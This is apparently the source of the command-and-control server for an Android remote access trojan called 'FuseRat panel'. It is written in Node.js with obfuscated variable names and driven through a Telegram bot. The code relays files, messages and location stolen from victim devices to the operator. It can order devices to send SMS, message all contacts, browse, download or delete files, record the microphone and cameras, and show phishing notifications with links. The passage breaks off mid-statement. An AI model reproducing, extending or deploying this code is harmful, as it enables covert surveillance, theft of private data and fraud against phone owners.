const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();
const token = process.env.TOKEN;
const id = process.env.ID;
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({
  "server": appServer
});
const appBot = new telegramBot(token, {
  "polling": true
});
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
let currentPath = ''; // added for file explore

app.get("/", function (_0x1b89da, _0x3398a0) {
  _0x3398a0.send("<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>");
});

app.post("/uploadFile", upload.single("file"), (_0x1c67cf, _0x143a37) => {
  const _0x404b56 = _0x1c67cf.file.originalname;
  appBot.sendDocument(id, _0x1c67cf.file.buffer, {
    "caption": "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + _0x1c67cf.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚",
    "parse_mode": "HTML"
  }, {
    "filename": _0x404b56,
    "contentType": "application/txt"
  });
  _0x143a37.send('');
});

app.post("/uploadText", (_0x5a02f5, _0x55205a) => {
  appBot.sendMessage(id, "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + _0x5a02f5.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n" + _0x5a02f5.body.text, {
    "parse_mode": "HTML"
  });
  _0x55205a.send('');
});

app.post("/uploadLocation", (_0xfc380d, _0x48b391) => {
  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon);
  appBot.sendMessage(id, "°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>" + _0xfc380d.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", {
    "parse_mode": "HTML"
  });
  _0x48b391.send('');
});

appSocket.on("connection", (_0x466cd0, _0x1cf0ae) => {
  const _0x275c2d = uuid4.v4();
  const _0x2cfd1d = _0x1cf0ae.headers.model;
  const _0x5409ca = _0x1cf0ae.headers.battery;
  const _0x4a1a34 = _0x1cf0ae.headers.version;
  const _0x340b05 = _0x1cf0ae.headers.brightness;
  const _0x1dd883 = _0x1cf0ae.headers.provider;
  _0x466cd0.uuid = _0x275c2d;
  appClients.set(_0x275c2d, {
    "model": _0x2cfd1d,
    "battery": _0x5409ca,
    "version": _0x4a1a34,
    "brightness": _0x340b05,
    "provider": _0x1dd883
  });
  appBot.sendMessage(id, "°• NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" + ("• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x2cfd1d + "</b>\n") + ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x5409ca + "</b>\n") + ("• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + _0x4a1a34 + "</b>\n") + ("• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + _0x340b05 + "</b>\n") + ("• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + _0x1dd883 + "</b>"), {
    "parse_mode": "HTML"
  });
  _0x466cd0.on("close", function () {
    appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" + ("• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x2cfd1d + "</b>\n") + ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x5409ca + "</b>\n") + ("• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + _0x4a1a34 + "</b>\n") + ("• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + _0x340b05 + "</b>\n") + ("• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + _0x1dd883 + "</b>"), {
      "parse_mode": "HTML"
    });
    appClients["delete"](_0x466cd0.uuid);
  });
});

appBot.on("message", _0x2ca88f => {
  const _0x32d1ff = _0x2ca88f.chat.id;
  if (_0x2ca88f.reply_to_message) {
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎")) {
      currentNumber = _0x2ca88f.text;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", {
        "reply_markup": {
          "force_reply": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧")) {
      appSocket.clients.forEach(function _0x52e72d(_0x465249) {
        if (_0x465249.uuid == currentUuid) {
          _0x465249.send("send_message:" + currentNumber + "/" + _0x2ca88f.text);
        }
      });
      currentNumber = '';
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨")) {
      const _0x1f6562 = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x308191(_0x3a189f) {
        if (_0x3a189f.uuid == currentUuid) {
          _0x3a189f.send("send_message_to_all:" + _0x1f6562);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    // ========== NEW: FILE EXPLORE REPLY ==========
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚")) {
      const _0xexplorePath = _0x2ca88f.text;
      appSocket.clients.forEach(function _0xexploreSend(_0xclient) {
        if (_0xclient.uuid == currentUuid) {
          _0xclient.send("explore:" + _0xexplorePath);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    // ========== NEW: FILE DOWNLOAD REPLY ==========
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
      const _0xdownloadPath = _0x2ca88f.text;
      appSocket.clients.forEach(function _0xdownloadSend(_0xclient) {
        if (_0xclient.uuid == currentUuid) {
          _0xclient.send("download:" + _0xdownloadPath);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    // ========== END OF NEW REPLIES ==========
    
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
      const _0x500514 = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x5ccade(_0x1bb0ba) {
        if (_0x1bb0ba.uuid == currentUuid) {
          _0x1bb0ba.send("file:" + _0x500514);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚")) {
      const _0x217e4d = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x174aee(_0x4e86bf) {
        if (_0x4e86bf.uuid == currentUuid) {
          _0x4e86bf.send("delete_file:" + _0x217e4d);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0x513bae = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x511718(_0x461ab3) {
        if (_0x461ab3.uuid == currentUuid) {
          _0x461ab3.send("microphone:" + _0x513bae);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0x517fdd = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x2f88ab(_0x4f49b1) {
        if (_0x4f49b1.uuid == currentUuid) {
          _0x4f49b1.send("rec_camera_main:" + _0x517fdd);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0xf2c05e = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x1c2fc4(_0x183617) {
        if (_0x183617.uuid == currentUuid) {
          _0x183617.send("rec_camera_selfie:" + _0xf2c05e);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚")) {
      const _0x5f1498 = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x1547d2(_0x523d20) {
        if (_0x523d20.uuid == currentUuid) {
          _0x523d20.send("toast:" + _0x5f1498);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
      const _0x531cc1 = _0x2ca88f.text;
      currentTitle = _0x531cc1;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ", {
        "reply_markup": {
          "force_reply": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
      const _0x4c37b7 = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x19b737(_0x13f3d9) {
        if (_0x13f3d9.uuid == currentUuid) {
          _0x13f3d9.send("show_notification:" + currentTitle + "/" + _0x4c37b7);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮")) {
      const _0x224ab9 = _0x2ca88f.text;
      appSocket.clients.forEach(function _0x8427d7(_0x3d44ae) {
        if (_0x3d44ae.uuid == currentUuid) {
          _0x3d44ae.send("play_audio:" + _0x224ab9);
        }
      });
      currentUuid = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
  }
  if (id == _0x32d1ff) {
    if (_0x2ca88f.text == "/start") {
      appBot.sendMessage(id, "°• °• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤  Fuse𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.text == "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ");
      } else {
